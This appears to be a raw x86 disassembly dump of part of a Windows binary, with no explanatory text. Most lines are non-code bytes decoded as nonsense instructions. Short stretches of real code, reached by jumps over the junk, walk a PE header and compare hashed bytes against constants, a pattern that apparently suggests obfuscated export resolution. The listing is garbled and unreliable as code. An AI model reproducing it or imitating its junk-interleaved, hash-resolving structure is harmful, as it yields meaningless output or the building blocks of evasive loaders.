  40210a:	mov    al,ds:0xef786d9
  40210f:	mov    eax,0xf0fc9977
  402114:	or     BYTE PTR [eax-0x34971634],bh
  40211a:	sub    eax,0x47471e72
  40211f:	int    0x4d
  402121:	mov    BYTE PTR [edi+0x39bb0fec],cl
  402127:	pop    ss
  402128:	les    eax,FWORD PTR [ecx]
  40212a:	dec    ecx
  40212b:	lods   al,BYTE PTR ds:[esi]
  40212c:	leave  
  40212d:	add    BYTE PTR [edi+0x6b],ch
  402130:	add    BYTE PTR [ebp+0x1a],0x13
  402134:	pop    esi
  402135:	out    dx,al
  402136:	popf   
  402137:	gs push eax
  402139:	ss xchg edx,eax
  40213b:	shr    esp,0x6d
  40213e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40213f:	push   eax
  402140:	dec    ebx
  402141:	add    ch,BYTE PTR [eax+0x7f]
  402144:	adc    DWORD PTR [eax+0x5e7bf30f],0x5e8400b4
  40214e:	xchg   BYTE PTR [ebx],ch
  402150:	pusha  
  402151:	and    DWORD PTR [edi-0x6a6b15c3],ebp
  402157:	jns    0x4020e8
  402159:	test   eax,0x3a3759dd
  40215e:	jb     0x402166
  402160:	or     dh,al
  402162:	ret    
  402163:	stos   DWORD PTR es:[edi],eax
  402164:	add    al,0xab
  402166:	aam    0x5
  402168:	cli    
  402169:	dec    esi
  40216a:	loopne 0x4021d6
  40216c:	xchg   DWORD PTR [ebx-0x69d7c02b],edx
  402172:	outs   dx,BYTE PTR ds:[esi]
  402173:	and    dl,dl
  402175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402176:	ret    0xfb6d
  402179:	call   DWORD PTR [eax]
  40217b:	cwde   
  40217c:	lock mov eax,ds:0xf65c93cb
  402182:	int    0x40
  402184:	and    al,0x7b
  402186:	repnz adc esi,0xd9cb6f98
  40218d:	jne    0x402172
  40218f:	imul   eax,DWORD PTR [edi],0x1a
  402192:	mov    bl,0xd4
  402194:	jae    0x402137
  402196:	or     al,0xea
  402198:	xchg   esi,eax
  402199:	jb     0x4021d6
  40219b:	jle    0x40216b
  40219d:	and    ah,BYTE PTR [edx]
  40219f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021a0:	leave  
  4021a1:	cli    
  4021a2:	push   edi
  4021a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021a4:	xor    ch,BYTE PTR ds:0x82e3b7d7
  4021aa:	cmp    BYTE PTR [esi+0x7939fc82],0x1c
  4021b1:	js     0x4021fa
  4021b3:	daa    
  4021b4:	sub    DWORD PTR [edx],ebp
  4021b6:	rcr    ch,cl
  4021b8:	pop    edx
  4021b9:	push   0x7396c98
  4021be:	(bad)  
  4021bf:	jecxz  0x4021e7
  4021c1:	aas    
  4021c2:	imul   edi,eax,0x8bec4e8e
  4021c8:	fidiv  DWORD PTR [edi-0x4f]
  4021cb:	in     eax,dx
  4021cc:	sbb    ebx,esp
  4021ce:	adc    al,0xf4
  4021d0:	aas    
  4021d1:	daa    
  4021d2:	mov    ds:0x220833a8,al
  4021d7:	int3   
  4021d8:	push   0xffffffc2
  4021da:	(bad)  
  4021db:	cmc    
  4021dc:	into   
  4021dd:	cmp    ch,dl
  4021df:	sbb    eax,0x1ae136b6
  4021e4:	jbe    0x40220e
  4021e6:	mov    BYTE PTR [ecx+0x25],dl
  4021e9:	out    dx,al
  4021ea:	jae    0x402264
  4021ec:	cmp    DWORD PTR [eax-0x36a2e2cd],ecx
  4021f2:	sub    edi,DWORD PTR [eax-0x30]
  4021f5:	retf   0xcf7f
  4021f8:	lock xchg edi,eax
  4021fa:	mov    edx,esi
  4021fc:	adc    DWORD PTR [esi-0x390b9ecc],ecx
  402202:	into   
  402203:	sbb    eax,0x77160f93
  402208:	(bad)  
  402209:	nop
  40220a:	pop    ebp
  40220b:	inc    ecx
  40220c:	add    edi,esi
  40220e:	sub    al,0xe4
  402210:	xchg   esp,eax
  402211:	cli    
  402212:	dec    dx
  402214:	aad    0x33
  402216:	inc    esi
  402217:	jo     0x40224f
  402219:	cs call 0xd6aaa00
  40221f:	xor    cl,BYTE PTR [esi+0x5f]
  402222:	adc    eax,0xc0cbe6a3
  402227:	call   0x9414aae1
  40222c:	ins    DWORD PTR es:[edi],dx
  40222d:	out    0x1e,eax
  40222f:	nop
  402230:	(bad)  
  402231:	loop   0x4022a0
  402233:	xchg   esi,eax
  402234:	retf   0x3769
  402237:	iret   
  402238:	aam    0x9d
  40223a:	sub    eax,0xbab0fbee
  40223f:	out    dx,al
  402240:	push   0xee74c770
  402245:	(bad)  [ecx]
  402247:	mov    esp,0x76b383c3
  40224c:	hlt    
  40224d:	xchg   ebp,eax
  40224e:	fld    TBYTE PTR [edi]
  402250:	or     edi,DWORD PTR [edx-0x27be7dc8]
  402256:	and    dh,0xc7
  402259:	xchg   esi,eax
  40225a:	dec    eax
  40225b:	xor    edi,DWORD PTR [eax+0x42]
  40225e:	xor    BYTE PTR [edx+0x3c],bh
  402261:	sbb    BYTE PTR [ebx-0x2f],cl
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	cmovne ebp,DWORD PTR [ebx+0x4c]
  4022cd:	lahf   
  4022ce:	mov    dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	std    
  4022d7:	xchg   esi,eax
  4022d8:	add    bl,ch
  4022da:	fs dec esi
  4022dc:	scas   eax,DWORD PTR es:[edi]
  4022dd:	or     DWORD PTR [si+0x274c],0x3f
  4022e3:	fcmovbe st,st(6)
  4022e5:	dec    ebx
  4022e6:	jne    0x402332
  4022e8:	ret    
  4022e9:	mov    ds:0x9bf86e1c,al
  4022ee:	cmp    BYTE PTR [ebx+0x661567cf],0x49
  4022f5:	sbb    eax,0x90990959
  4022fa:	mov    ebx,0x6f12590b
  4022ff:	or     ecx,ebp
  402301:	add    edi,esp
  402303:	icebp  
  402304:	and    ebx,eax
  402306:	dec    esi
  402307:	outs   dx,DWORD PTR ds:[esi]
  402308:	pop    esi
  402309:	jns    0x4022ad
  40230b:	sahf   
  40230c:	aad    0xd2
  40230e:	push   ebx
  40230f:	mov    edx,0x278fe93
  402314:	push   ebx
  402315:	jp     0x4022a4
  402317:	(bad)
  40231a:	inc    edx
  40231b:	push   edx
  40231c:	int    0x2b
  40231e:	mov    ecx,0xd89edfad
  402323:	fadd   QWORD PTR [ebp-0x36]
  402326:	mov    bl,0xf5
  402328:	xor    BYTE PTR [eax],ch
  40232a:	add    cl,ah
  40232c:	sbb    eax,0xff2f0332
  402331:	and    al,0xcc
  402333:	in     al,dx
  402334:	push   ds
  402335:	add    esi,eax
  402337:	jl     0x402309
  402339:	jbe    0x4023a0
  40233b:	fs mov dl,0x41
  40233e:	mov    esp,0x7231ac7
  402343:	and    eax,DWORD PTR [eax-0x760998d1]
  402349:	fadd   st,st(7)
  40234b:	add    bh,al
  40234d:	push   ebp
  40234e:	(bad)
  402353:	mov    al,0x9f
  402355:	inc    ebp
  402356:	xlat   BYTE PTR ds:[ebx]
  402357:	js     0x4022f4
  402359:	mov    DWORD PTR ds:[edx+0x7bbbc9c4],esi
  402360:	std    
  402361:	(bad)  
  402362:	mov    esp,0x45532c8d
  402367:	rcr    BYTE PTR [esi+0x6a],0x10
  40236b:	jnp    0x402365
  40236d:	inc    ebp
  40236e:	scas   eax,DWORD PTR es:[edi]
  40236f:	push   ds
  402370:	aaa    
  402371:	inc    esp
  402372:	pop    edx
  402373:	and    al,BYTE PTR [edi+0x18]
  402376:	push   es
  402377:	jb     0x40239b
  402379:	pop    es
  40237a:	psubw  mm0,mm3
  40237d:	(bad)  
  40237e:	push   eax
  40237f:	xchg   edx,eax
  402380:	and    BYTE PTR ds:0x2333158a,cl
  402386:	nop
  402387:	lds    esp,FWORD PTR [ecx+ebp*4]
  40238a:	mov    WORD PTR [eax-0x573ee948],ds
  402390:	pusha  
  402391:	(bad)  
  402392:	pop    eax
  402393:	push   es
  402394:	mov    esi,0xa86a7614
  402399:	jno    0x402408
  40239b:	sbb    ebp,edi
  40239d:	jge    0x402382
  40239f:	pushf  
  4023a0:	popa   
  4023a1:	push   ecx
  4023a2:	popf   
  4023a3:	out    dx,al
  4023a4:	sub    eax,0x56ecae3f
  4023a9:	call   0x4058:0x4b98971
  4023b0:	push   edx
  4023b1:	mov    ds:0x8ff01ec0,al
  4023b6:	sbb    al,0xdf
  4023b8:	es cmc 
  4023ba:	adc    DWORD PTR [edx-0x4a],ecx
  4023bd:	jg     0x4023ad
  4023bf:	gs cdq 
  4023c1:	fsubr  st,st(0)
  4023c3:	adc    esp,edx
  4023c5:	mov    cl,0x4a
  4023c7:	add    BYTE PTR [esi+0x75],bh
  4023ca:	loope  0x4023b4
  4023cc:	mov    edi,0x1d0aa0c3
  4023d1:	bswap  esi
  4023d3:	pop    ebx
  4023d4:	aas    
  4023d5:	test   al,0xf2
  4023d7:	retf   
  4023d8:	add    ebp,ebx
  4023da:	lods   al,BYTE PTR ds:[esi]
  4023db:	xor    eax,0x4b58e3a6
  4023e0:	sbb    eax,0x140ae8dd
  4023e5:	icebp  
  4023e6:	mov    BYTE PTR ds:0x82f590aa,bh
  4023ec:	pop    edx
  4023ed:	push   ds
  4023ee:	mov    es,eax
  4023f0:	pushf  
  4023f1:	aas    
  4023f2:	pop    ebx
  4023f3:	or     DWORD PTR [ebx+ebp*1-0x1],ecx
  4023f7:	iret   
  4023f8:	mov    BYTE PTR [ebp+0x5e],ah
  4023fb:	aad    0xf1
  4023fd:	aam    0x21
  4023ff:	inc    esp
  402400:	xchg   edi,eax
  402401:	sbb    BYTE PTR [ecx-0x62],0xa8
  402405:	xchg   ah,dl
  402407:	push   ecx
  402408:	mov    dh,0x92
  40240a:	adc    DWORD PTR [edi-0x82e9215],esp
  402410:	sbb    DWORD PTR [ebx-0x7b],ecx
  402413:	shufps xmm3,XMMWORD PTR [eax],0x57
  402417:	loop   0x402493
  402419:	dec    edx
  40241a:	mov    ecx,cs
  40241c:	adc    eax,0x4af52038
  402421:	gs stos DWORD PTR es:[edi],eax
  402423:	stos   DWORD PTR es:[edi],eax
  402424:	jns    0x40243a
  402426:	sahf   
  402427:	xchg   edi,eax
  402428:	lods   eax,DWORD PTR ds:[esi]
  402429:	jle    0x402494
  40242b:	mov    al,0xa0
  40242d:	call   0x808eb31f
  402432:	dec    esi
  402433:	jbe    0x40249a
  402435:	fld    QWORD PTR [ecx+0x1b]
  402438:	fcom   QWORD PTR [ebx-0x74]
  40243b:	pop    ds
  40243c:	add    ch,BYTE PTR [esi+0x44]
  40243f:	cmp    al,0x5
  402441:	rcr    DWORD PTR [edx-0x68d3653f],1
  402447:	ins    BYTE PTR es:[edi],dx
  402448:	repz and ah,BYTE PTR [edi+0x15]
  40244c:	ja     0x4024c7
  40244e:	jp     0x402435
  402450:	add    cl,al
  402452:	cli    
  402453:	jmp    0xc579f28b
  402458:	pushf  
  402459:	rcr    DWORD PTR [esi+0x68c7bf54],0x98
  402460:	ins    DWORD PTR es:[edi],dx
  402461:	mov    esp,DWORD PTR [esi+0x478b5f2e]
  402467:	call   0x1cf7:0x765705dc
  40246e:	cmp    DWORD PTR [ecx-0x189f3586],0xedbc9ac
  402478:	lahf   
  402479:	mov    eax,0x517ca25e
  40247e:	lods   eax,DWORD PTR ds:[esi]
  40247f:	cmp    dl,BYTE PTR [eax]
  402481:	shld   DWORD PTR [ecx+eax*4+0xe4865c7],ecx,0xa2
  40248a:	xor    eax,ebp
  40248c:	mov    edx,0x8bf84d8b
  402491:	or     DWORD PTR [ebx+0x45890804],ecx
  402497:	in     al,0x8b
  402499:	inc    ebp
  40249a:	or     BYTE PTR [ebx],dh
  40249c:	mov    BYTE PTR [ebx],0xc7
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0x215894ae
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	mov    ds:0x6bcb960a,eax
  4024de:	mov    ds:0x54f2933b,eax
  4024e3:	loop   0x4024f8
  4024e5:	xchg   edi,eax
  4024e6:	outs   dx,BYTE PTR ds:[esi]
  4024e7:	push   cs
  4024e8:	fld    TBYTE PTR [edi]
  4024ea:	sub    esi,DWORD PTR [edi]
  4024ec:	jmp    0x402499
  4024ee:	and    eax,edx
  4024f0:	sub    eax,0x96e9153c
  4024f5:	leave  
  4024f6:	xor    DWORD PTR [edx-0x691e967b],esp
  4024fc:	jae    0x4024b1
  4024fe:	mov    bh,0x1b
  402500:	pushf  
  402501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402502:	mov    ch,0x2b
  402504:	mov    dh,BYTE PTR [edi-0x693ef573]
  40250a:	pop    ss
  40250b:	adc    DWORD PTR ds:0x7d713942,edi
  402511:	out    0x8d,eax
  402513:	cmp    cl,BYTE PTR [edi-0x5a0bf5e4]
  402519:	aas    
  40251a:	cwde   
  40251b:	xchg   ecx,eax
  40251c:	or     dl,BYTE PTR [eax]
  40251e:	out    dx,eax
  40251f:	sub    DWORD PTR [ebp+0x6b],eax
  402522:	add    DWORD PTR [edx+0x79],esi
  402525:	mov    ds:0xaa31ede8,eax
  40252a:	fld    TBYTE PTR [esi]
  40252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252d:	es nop
  40252f:	mov    al,bl
  402531:	cwde   
  402532:	sub    bh,BYTE PTR [ebp-0x4a]
  402535:	in     eax,0x32
  402537:	retf   
  402538:	retf   0x8d35
  40253b:	shl    DWORD PTR [bx+si+0x24af],0x29
  402541:	mov    edx,0x23cd6526
  402546:	lea    ecx,[edi-0x69053aa3]
  40254c:	add    eax,0xba4197bf
  402551:	cwde   
  402552:	dec    ebp
  402553:	(bad)  
  402554:	out    dx,eax
  402555:	xor    al,0x40
  402557:	sub    BYTE PTR [ebx+0x13],0xad
  40255b:	test   edi,edx
  40255d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40255e:	pop    ss
  40255f:	dec    esi
  402560:	imul   eax,DWORD PTR [eax],0x1a42f077
  402566:	dec    esi
  402567:	test   edi,esp
  402569:	clc    
  40256a:	lods   al,BYTE PTR ds:[esi]
  40256b:	shl    BYTE PTR [ebx],0x78
  40256e:	pop    es
  40256f:	lods   al,BYTE PTR ds:[esi]
  402570:	pop    esp
  402571:	inc    edx
  402572:	test   eax,0x23b795e6
  402577:	mov    ah,0x36
  402579:	dec    esi
  40257a:	sub    ah,BYTE PTR ds:0x7b4bb2b6
  402580:	and    DWORD PTR [ebp+eax*8+0x3523c1c9],ebp
  402587:	jmp    0x402547
  402589:	(bad)  
  40258a:	sti    
  40258b:	int    0xd3
  40258d:	dec    edi
  40258e:	and    ch,dl
  402590:	pop    es
  402591:	rol    DWORD PTR [edi-0x11],0xda
  402595:	xchg   dl,bl
  402597:	adc    dh,cl
  402599:	push   edi
  40259a:	hlt    
  40259b:	or     DWORD PTR ss:[ebp+0x550a7921],eax
  4025a2:	mov    dh,0xd7
  4025a4:	loope  0x402604
  4025a6:	inc    ebp
  4025a7:	ret    
  4025a8:	test   al,0x3e
  4025aa:	push   0xec6ff9ab
  4025af:	cmp    eax,0xac1ac3d4
  4025b4:	in     al,dx
  4025b5:	lods   eax,DWORD PTR ds:[esi]
  4025b6:	adc    DWORD PTR [esi+0x18],0x42
  4025ba:	cmp    al,0xa5
  4025bc:	shl    DWORD PTR [eax-0x7297e787],0x82
  4025c3:	in     eax,dx
  4025c4:	fldcw  WORD PTR [edx+0x6a]
  4025c7:	and    ebx,ebp
  4025c9:	lods   eax,DWORD PTR ds:[esi]
  4025ca:	(bad)  
  4025cb:	mov    al,BYTE PTR [edx]
  4025cd:	xor    al,0x7d
  4025cf:	int    0x89
  4025d1:	sbb    BYTE PTR ds:0x17023761,bl
  4025d7:	or     esp,DWORD PTR [edx]
  4025d9:	xchg   esp,eax
  4025da:	pop    es
  4025db:	xor    eax,0x751187a5
  4025e0:	pop    ss
  4025e1:	or     al,0x6e
  4025e4:	icebp  
  4025e5:	ins    BYTE PTR es:[edi],dx
  4025e6:	in     eax,0x1a
  4025e8:	div    DWORD PTR [ecx*4+0x2a658c2f]
  4025ef:	ins    DWORD PTR es:[edi],dx
  4025f0:	fst    DWORD PTR [ebx+0x427caf89]
  4025f6:	in     eax,dx
  4025f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f8:	xor    bl,BYTE PTR [ebx-0x10]
  4025fb:	lods   al,BYTE PTR ds:[esi]
  4025fc:	rol    BYTE PTR [ebx],0x86
  4025ff:	sub    ebp,DWORD PTR [ebp+0x4b]
  402602:	sbb    DWORD PTR [eax+0x63],edi
  402605:	mov    ds:0xe411402b,al
  40260a:	xor    edx,DWORD PTR [eax+0x57]
  40260d:	repz pop ss
  40260f:	sub    dl,BYTE PTR [ebp-0x9]
  402612:	lahf   
  402613:	push   0x4a8fe440
  402618:	inc    esi
  402619:	mov    esi,0x39453816
  40261e:	in     al,0xd8
  402620:	inc    esi
  402621:	sub    bh,BYTE PTR [ebx]
  402623:	jns    0x402681
  402625:	add    eax,0x140b9304
  40262a:	pop    edi
  40262b:	(bad)  
  40262c:	inc    ecx
  40262d:	jp     0x4025bc
  40262f:	(bad)  
  402630:	jmp    0xb083:0x636082f2
  402637:	mov    ah,0xd
  402639:	adc    eax,0xa2138a85
  40263e:	popa   
  40263f:	mov    al,ds:0x9cb23a8
  402644:	icebp  
  402645:	cmp    eax,0x12167b0c
  40264a:	fstp   TBYTE PTR [ecx]
  40264c:	xchg   ebp,eax
  40264d:	dec    esp
  40264e:	sub    esp,DWORD PTR [esi+ebp*8]
  402651:	pusha  
  402652:	lock adc al,0xc7
  402655:	jbe    0x402653
  402657:	loop   0x402672
  402659:	pop    es
  40265a:	mov    ebp,ebx
  40265c:	inc    eax
  40265d:	adc    cl,dl
  40265f:	loop   0x402633
  402661:	je     0x4025f2
  402663:	enter  0x29ee,0xe5
  402667:	(bad)  
  402668:	pusha  
  402669:	fwait
  40266a:	ja     0x4025fa
  40266c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40266e:	test   DWORD PTR [esi],eax
  402670:	mov    ds:0xfda6c66d,eax
  402675:	sar    BYTE PTR [eax-0x11bc340],1
  40267b:	icebp  
  40267c:	lock sub eax,0xae9954e2
  402682:	mov    BYTE PTR [eax],ch
  402684:	sti    
  402685:	pusha  
  402686:	data16 mov cl,0xcd
  402689:	sbb    eax,0x7c8d9ef0
  40268e:	ds push es
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0xb3
  4026c9:	in     eax,dx
  4026ca:	test   al,0xea
  4026cc:	and    al,0xf
  4026ce:	jle    0x40274e
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	stc    
  4026d5:	cmp    al,0xe9
  4026d7:	jg     0x402737
  4026d9:	mov    ecx,0x73afec41
  4026de:	out    dx,eax
  4026df:	in     al,dx
  4026e0:	lea    ebp,[ecx-0x4d]
  4026e3:	bound  ecx,QWORD PTR [ebp-0x6]
  4026e6:	pop    esi
  4026e7:	inc    edi
  4026e8:	jmp    0x182:0x37bad92d
  4026ef:	imul   esi,ebp,0x30
  4026f2:	xchg   edx,eax
  4026f3:	and    DWORD PTR [ebp+0x37],0x152ee6e9
  4026fa:	xchg   esi,eax
  4026fb:	fisubr WORD PTR [edx+0x15]
  4026fe:	pop    edx
  4026ff:	sub    al,0xf3
  402701:	cmc    
  402702:	adc    dl,BYTE PTR [ebx+0x5b0d8edf]
  402708:	cmp    al,0x9b
  40270a:	mov    ebp,0x86ecf0a4
  40270f:	mov    ebp,0x15d66fa4
  402714:	fisub  WORD PTR [ebx+eiz*1-0x439a5500]
  40271b:	aas    
  40271c:	lea    ecx,ss:[ecx+0x710fd0b2]
  402723:	(bad)  
  402725:	inc    esi
  402726:	xchg   ebp,ebx
  402728:	data16 or BYTE PTR [ecx-0x15235c35],al
  40272f:	and    ecx,0xb7764420
  402735:	shl    DWORD PTR [ecx+0x50f7d93c],0x38
  40273c:	add    DWORD PTR [esi+0x7ecb0ef9],eax
  402742:	jge    0x4027a8
  402744:	cmp    eax,0x48e44ea9
  402749:	mov    dh,BYTE PTR [edx+ebp*8+0x5]
  40274d:	cli    
  40274e:	adc    eax,0xa9631559
  402753:	jg     0x402719
  402755:	fiadd  DWORD PTR [ebp-0x39]
  402758:	mov    al,ds:0xa7c47688
  40275d:	test   DWORD PTR [edi+0x5bbcfa49],eax
  402763:	jno    0x40271b
  402765:	aas    
  402766:	div    DWORD PTR [edi]
  402768:	icebp  
  402769:	jecxz  0x4027de
  40276b:	jge    0x402749
  40276d:	pop    es
  40276e:	mov    ebx,0x4693f410
  402773:	push   esp
  402774:	hlt    
  402775:	or     al,0xaf
  402777:	push   edx
  402778:	inc    ebx
  402779:	repz sahf 
  40277b:	push   es
  40277c:	sbb    ecx,ebx
  40277e:	xchg   esp,eax
  40277f:	jmp    0x402750
  402781:	xor    DWORD PTR [ecx-0x21],edi
  402784:	pop    es
  402785:	sar    DWORD PTR ds:0x4014b578,cl
  40278b:	push   0x7f
  40278d:	push   ecx
  40278e:	jl     0x4027dc
  402790:	frstor [esi+0x7c]
  402793:	mov    ebp,0x3186415d
  402798:	xchg   DWORD PTR [edx],ecx
  40279a:	je     0x402748
  40279c:	fucom  st(1)
  40279e:	and    eax,DWORD PTR [ebx+0x41]
  4027a1:	test   eax,0x2d6d7375
  4027a6:	pop    ecx
  4027a7:	push   edx
  4027a8:	push   ebx
  4027a9:	les    edx,FWORD PTR [ebp-0x231db148]
  4027af:	xchg   edx,eax
  4027b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b1:	sahf   
  4027b2:	sbb    BYTE PTR [esi+0x11],cl
  4027b5:	mov    al,ds:0xfad63f6e
  4027ba:	pusha  
  4027bb:	retf   
  4027bc:	pop    ds
  4027bd:	inc    esp
  4027be:	call   0x4b50:0xd4313dae
  4027c5:	mov    WORD PTR [esi+0x69],gs
  4027c8:	int3   
  4027c9:	lods   eax,DWORD PTR ds:[esi]
  4027ca:	xor    DWORD PTR [eax-0xacf672f],esp
  4027d0:	retf   
  4027d1:	dec    esi
  4027d2:	sbb    al,0xcf
  4027d4:	int3   
  4027d5:	loope  0x4027a5
  4027d7:	rcl    BYTE PTR [eax-0x2f],1
  4027da:	std    
  4027db:	dec    ebp
  4027dc:	out    dx,eax
  4027dd:	cmp    DWORD PTR [esi+0x4c],edx
  4027e0:	pop    esi
  4027e1:	adc    WORD PTR [eax+0x23],ax
  4027e5:	mov    ebp,0x1fc680dc
  4027ea:	or     DWORD PTR gs:[esi-0x30da410f],esi
  4027f1:	sbb    cl,BYTE PTR [edx+0x68]
  4027f4:	pop    ecx
  4027f5:	stc    
  4027f6:	addr16 cmp al,0xbd
  4027f9:	jmp    0x125fbdca
  4027fe:	fldenv [esi+0x3234f088]
  402804:	xchg   ebx,eax
  402805:	xchg   esi,eax
  402806:	cmp    edx,edx
  402808:	fdiv   DWORD PTR [ebx]
  40280a:	mov    cl,0x34
  40280c:	jl     0x402791
  40280e:	jecxz  0x4027f9
  402810:	adc    BYTE PTR [edi+edx*1+0x2f8fbe8f],0x70
  402818:	rol    DWORD PTR [esi],0xbb
  40281b:	adc    eax,0x74633379
  402820:	aad    0x88
  402822:	fdivrp st(7),st
  402824:	pop    ebx
  402825:	ret    0xff04
  402828:	lods   eax,DWORD PTR ds:[esi]
  402829:	cs stc 
  40282b:	mov    ds:0x15c73bc4,eax
  402830:	std    
  402831:	pop    ss
  402832:	push   ds
  402833:	mov    cl,0x3a
  402835:	and    BYTE PTR [esi+0x4e],bl
  402838:	sbb    BYTE PTR [esi-0x14],dl
  40283b:	adc    al,0xa
  40283d:	clc    
  40283e:	dec    ebp
  40283f:	cmc    
  402840:	inc    eax
  402841:	aam    0xfe
  402843:	or     ah,ch
  402845:	das    
  402846:	or     DWORD PTR [edx+0x6e],esp
  402849:	inc    edi
  40284a:	mov    al,ds:0xd17055fd
  40284f:	push   cs
  402850:	jmp    0x539a:0xfdca6d3d
  402857:	mov    al,ds:0x338701c5
  40285c:	je     0x4028dc
  40285e:	loope  0x4028d8
  402860:	aas    
  402861:	loope  0x4028b7
  402863:	pop    ebp
  402864:	xchg   esi,eax
  402865:	mov    DWORD PTR [ecx+0x116c06d1],ebx
  40286b:	sub    al,0x2b
  40286d:	rcl    BYTE PTR [esi],cl
  40286f:	repz and BYTE PTR [eax+0x27],bl
  402873:	xor    edi,esp
  402875:	or     DWORD PTR [edx],esp
  402877:	push   ds
  402878:	ins    DWORD PTR es:[edi],dx
  402879:	mov    eax,0xa1ea8957
  40287e:	dec    eax
  40287f:	cmp    eax,0xf9a8bc43
  402884:	jmp    0x4028f9
  402886:	sub    BYTE PTR [eax-0x761084c4],bh
  40288c:	add    ecx,ebp
  40288e:	and    al,0x0
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax-0x1421fbaf]
  4028ec:	mov    cs,edx
  4028ee:	pop    edx
  4028ef:	push   ebx
  4028f0:	or     BYTE PTR [esi+0x7e],bh
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x4028e4
  4028f8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028fb:	call   0xc74596d7
  402900:	jb     0x402953
  402902:	xchg   ecx,eax
  402903:	xchg   esi,eax
  402904:	enter  0x13b9,0x7e
  402908:	xchg   esp,eax
  402909:	in     eax,0x6e
  40290b:	add    bl,cl
  40290d:	xor    bh,dl
  40290f:	das    
  402910:	aas    
  402911:	inc    edi
